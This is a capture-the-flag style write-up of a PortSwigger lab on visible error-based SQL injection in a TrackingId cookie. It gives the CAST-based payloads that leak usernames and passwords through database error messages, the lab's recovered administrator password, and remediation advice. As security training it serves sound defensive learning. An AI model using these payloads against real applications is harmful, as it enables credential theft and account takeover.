# Visible error-based SQL injection - PortSwigger Lab 38

**Severity:** Medium
**Target:** https://0a5f00fb041c096e81cd6653004b00cc.web-security-academy.net

## Summary
The application concatenates the user input directly into the query and interpreted as SQL.


## Vulnerability Details
**Type:** Visible error-based SQLi
**Root Cause:** Lack of input sanitization/validation on the PostgreSQL DB, the vector is created via concatenation in the cookie. 
**Endpoint:**  /

## Steps to Reproduce
``Only Burp``
1. Delete all the parameter value to put the payload right after ``TrackingId=``
2. The TrackingId field has a low character limit, causing longer payloads to be truncated — deleting the existing value is required to fit the payload. ``'||CAST((SELECT username FROM users LIMIT 1) AS int--`` to enumerate de username
3. Use ``'||CAST((SELECT password FROM users LIMIT 1) AS int--`` to find the password.
4. Login into the adminitrator account


## Proof of Concept

``'||CAST((SELECT username FROM users LIMIT 1) AS int--``

``'||CAST((SELECT password FROM users LIMIT 1) AS int--``


## Result

<br>
<img width="1858" height="953" alt="Screenshot From 2026-04-30 10-56-51" src="https://github.com/user-attachments/assets/c7bc3920-bd71-4d37-a165-8b507577d804" />


<br>
<br>
<img width="1858" height="953" alt="Screenshot From 2026-04-30 10-39-40" src="https://github.com/user-attachments/assets/a579bf8d-31d2-4cf2-87d4-40e1bf299865" />


<br>
<br>
<img width="1918" height="969" alt="image" src="https://github.com/user-attachments/assets/782994b6-1eac-412f-a16a-145bd0067c1b" />

<br>
<br>



user: administrator password:mgwoii7j6bvnarg0aza8


## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Use parameterized queries (prepared statements) to prevent user input from being interpreted as SQL. 
Disable verbose error messages in production.
